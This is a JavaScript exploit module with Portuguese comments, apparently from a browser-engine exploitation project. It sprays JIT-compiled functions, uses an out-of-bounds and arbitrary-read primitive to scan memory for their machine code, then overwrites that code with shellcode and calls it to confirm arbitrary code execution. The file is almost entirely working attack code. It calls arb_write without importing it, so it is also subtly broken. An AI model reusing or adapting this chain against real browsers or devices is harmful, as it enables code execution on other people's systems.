// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R53 - Ataque de Sobrescrita de Código JIT)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    arb_read
} from '../core_exploit.mjs';

export const FNAME_MODULE_JIT_OVERWRITE_R53 = "JIT_Overwrite_ACE_R53";

// Shellcode que retorna 0x1337
// Opcodes para: mov eax, 0x1337; ret
const SHELLCODE = new Uint8Array([0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3]);

// O corpo da função que vamos "pulverizar" na memória JIT
const JIT_FUNC_BODY = "return 12345;"; // Um valor de retorno único
// Opcodes para: mov eax, 12345 (0x3039); ret
// B8 39 30 00 00 -> mov eax, 0x3039
// C3              -> ret
const JIT_FUNC_MARKER = [0xb8, 0x39, 0x30, 0x00, 0x00, 0xc3];

export async function executeJITOverwrite_R53() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_JIT_OVERWRITE_R53;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de ACE via Sobrescrita de JIT ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Não iniciado.", errorOccurred: null };
    
    try {
        // --- FASE 1: JIT SPRAY ---
        logS3(`--- Fase 1 (R53): Pulverizando memória com funções JIT ---`, "subtest", FNAME_CURRENT_TEST);
        
        const JIT_SPRAY_COUNT = 1000;
        const WARMUP_CALLS = 100;
        let sprayed_funcs = [];

        for (let i = 0; i < JIT_SPRAY_COUNT; i++) {
            // Criamos uma nova função a cada iteração para garantir que seja uma nova compilação
            sprayed_funcs.push(new Function(JIT_FUNC_BODY));
        }

        for (let i = 0; i < JIT_SPRAY_COUNT; i++) {
            for (let j = 0; j < WARMUP_CALLS; j++) {
                sprayed_funcs[i]();
            }
        }
        logS3(`[R53] JIT Spray concluído. ${JIT_SPRAY_COUNT} funções compiladas.`, 'info');

        // --- FASE 2: PREPARAÇÃO OOB E BUSCA ---
        logS3(`--- Fase 2 (R53): Preparando OOB e Buscando Código JIT ---`, "subtest", FNAME_CURRENT_TEST);
        
        // Ativamos a OOB DEPOIS do JIT Spray para aumentar a chance de proximidade
        await triggerOOB_primitive({ force_reinit: true });
        
        const SCAN_START = new AdvancedInt64(0x800000000); // Endereço de início da busca (precisa de ajuste para o alvo)
        const SCAN_SIZE = 0x40000000; // Escaneia 1GB
        const SCAN_STEP = 0x1000; // Pulos de 4KB
        let found_jit_func_addr = null;

        for (let i = 0; i < SCAN_SIZE / SCAN_STEP; i++) {
            let current_addr = SCAN_START.add(i * SCAN_STEP);
            if (i > 0 && i % 512 === 0) {
                 logS3(`[Scanner JIT] Buscando em ${current_addr.toString(true)}...`, 'debug');
            }
            try {
                // Lê o primeiro byte do marcador
                if (await arb_read(current_addr, 1) === JIT_FUNC_MARKER[0]) {
                    // Se corresponder, lê o resto e compara
                    let match = true;
                    for (let j = 1; j < JIT_FUNC_MARKER.length; j++) {
                        if (await arb_read(current_addr.add(j), 1) !== JIT_FUNC_MARKER[j]) {
                            match = false;
                            break;
                        }
                    }
                    if (match) {
                        found_jit_func_addr = current_addr;
                        break;
                    }
                }
            } catch (e) { /* Ignora erros de leitura */ }
        }

        if (!found_jit_func_addr) {
            throw new Error("Não foi possível encontrar o código da função JIT na memória. A estratégia de busca falhou.");
        }
        logS3(`[R53] Código da função JIT encontrado no endereço: ${found_jit_func_addr.toString(true)}`, 'vuln');
        
        // --- FASE 3: SOBRESCRITA E EXECUÇÃO ---
        logS3(`--- Fase 3 (R53): Sobrescrevendo código JIT e Disparando ---`, "subtest", FNAME_CURRENT_TEST);
        
        for (let i = 0; i < SHELLCODE.length; i++) {
            await arb_write(found_jit_func_addr.add(i), SHELLCODE[i], 1);
        }
        logS3(`[R53] Shellcode escrito sobre a função JIT.`, 'good');

        const new_result = sprayed_funcs[0]();
        logS3(`[R53] Função corrompida retornou: ${toHex(new_result)}`, 'leak');

        if (new_result === 0x1337) {
            result.success = true;
            result.msg = "Execução de Código Arbitrário confirmada! Shellcode executado com sucesso.";
        } else {
            throw new Error(`Falha na verificação do ACE. Esperado 0x1337, recebido ${toHex(new_result)}.`);
        }
        
    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R53): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R53 test:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
